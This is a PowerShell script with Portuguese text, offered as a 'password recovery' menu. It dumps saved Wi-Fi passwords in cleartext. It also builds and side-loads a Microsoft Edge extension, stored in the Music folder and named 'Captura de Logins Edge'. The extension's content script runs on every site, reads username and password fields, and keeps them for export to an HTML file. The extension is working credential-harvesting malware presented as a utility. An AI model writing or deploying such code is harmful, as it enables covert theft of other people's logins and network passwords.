#Ativar modo programador no edge
#comando para abrir modo programador
#edge://extensions

function Get-WiFiPasswords {
    Write-Host "`n🌐 Verificando senhas de Wi-Fi salvas..." -ForegroundColor Cyan
    try {
        $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }

        if (-not $wifiProfiles) {
            Write-Host "⚠️ Nenhum perfil de Wi-Fi encontrado." -ForegroundColor DarkYellow
        }

        foreach ($profile in $wifiProfiles) {
            $wifiInfo = netsh wlan show profile name="$profile" key=clear
            $wifiPass = ($wifiInfo | Select-String "Key Content") -replace '.*:\s*', ''
            $wifiPass = $wifiPass.Trim()

            if ($wifiPass) {
                Write-Host "`n✅ Wi-Fi: $profile" -ForegroundColor Green
                Write-Host "🔑 Senha: $wifiPass" -ForegroundColor Yellow
            } else {
                Write-Host "`n⚠️ Wi-Fi: $profile - senha não encontrada ou não salva." -ForegroundColor DarkYellow
            }
        }
    } catch {
        Write-Host "❌ Erro ao recuperar senhas de Wi-Fi. Execute como administrador." -ForegroundColor Red
    }
}

function Cria-ExtensaoEdge {
    $extDir = [Environment]::GetFolderPath("MyMusic") + "\extensao_edge"
    if (-not (Test-Path $extDir)) {
        New-Item -ItemType Directory -Path $extDir | Out-Null
    }

    Set-Content "$extDir\manifest.json" @'
{
  "manifest_version": 2,
  "name": "Captura de Logins Edge",
  "version": "1.0",
  "permissions": ["activeTab", "storage", "downloads"],
  "background": {
    "scripts": ["background.js"],
    "persistent": false
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_end"
  }],
  "browser_action": {
    "default_popup": "popup.html",
    "default_title": "Exportar logins"
  }
}
'@ -Encoding UTF8

    Set-Content "$extDir\background.js" 'console.log("Extensão Edge pronta.");' -Encoding UTF8

    Set-Content "$extDir\content.js" @'
setTimeout(() => {
  const pwdInput = document.querySelector("input[type='password']");
  const userInput = document.querySelector("input[type='text'], input[type='email']");
  if (userInput && pwdInput) {
    const login = {
      site: location.hostname,
      usuario: userInput.value || "vazio",
      senha: pwdInput.value || "vazio"
    };
    chrome.storage.local.get({logins: []}, data => {
      data.logins.push(login);
      chrome.storage.local.set({logins: data.logins});
    });
  }
}, 3000);
'@ -Encoding UTF8

    Set-Content "$extDir\popup.html" @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Exportar</title></head>
<body>
  <h3>Exportar logins</h3>
  <button id="exportar">Exportar para HTML</button>
  <script src="popup.js"></script>
</body>
</html>
'@ -Encoding UTF8

    Set-Content "$extDir\popup.js" @'
document.getElementById("exportar").addEventListener("click", function() {
  chrome.storage.local.get("logins", data => {
    const html = ["<html><body><h2>Logins capturados</h2><table border=1><tr><th>Site</th><th>Usuário</th><th>Senha</th></tr>"];
    (data.logins || []).forEach(item => {
      html.push(`<tr><td>${item.site}</td><td>${item.usuario}</td><td>${item.senha}</td></tr>`);
    });
    html.push("</table></body></html>");

    const blob = new Blob(html, {type: "text/html"});
    const url = URL.createObjectURL(blob);
    chrome.downloads.download({
      url: url,
      filename: "logins_edge_export.html"
    });
  });
});
'@ -Encoding UTF8

    Write-Host "`n✅ Extensão criada na pasta MÚSICA:" -ForegroundColor Green
    Write-Host "$extDir" -ForegroundColor Cyan

    Start-Process "msedge.exe" "edge://extensions"

    Write-Host "`n➡️ No Edge:" -ForegroundColor Yellow
    Write-Host "1. Ative o 'Modo do desenvolvedor'" -ForegroundColor Gray
    Write-Host "2. Clique em 'Carregar sem compactação'" -ForegroundColor Gray
    Write-Host "3. Selecione a pasta: $extDir" -ForegroundColor Cyan
}

# ===============================
# MENU FINAL COM LOOP FUNCIONAL
# ===============================

do {
    Clear-Host
    Write-Host "🔐 MENU DE RECUPERAÇÃO DE SENHAS" -ForegroundColor Cyan
    Write-Host "======================================="
    Write-Host "1. Recuperar senhas de Wi-Fi"
    Write-Host "2. Criar e abrir extensão no Edge para capturar logins"
    Write-Host "3. Sair"
    Write-Host "======================================="

    $choice = Read-Host "`nEscolha uma opção (1-3)"

    switch ($choice) {
        '1' {
            Get-WiFiPasswords
        }
        '2' {
            Cria-ExtensaoEdge
        }
        '3' {
            Write-Host "`n👋 Saindo... Até logo!" -ForegroundColor Cyan
            break
        }
        default {
            Write-Host "`n❌ Opção inválida. Tente novamente." -ForegroundColor Red
        }
    }

    if ($choice -ne '3') {
        Write-Host "`n🔁 Pressione Enter para voltar ao menu..."
        Read-Host
    }

} while ($true)
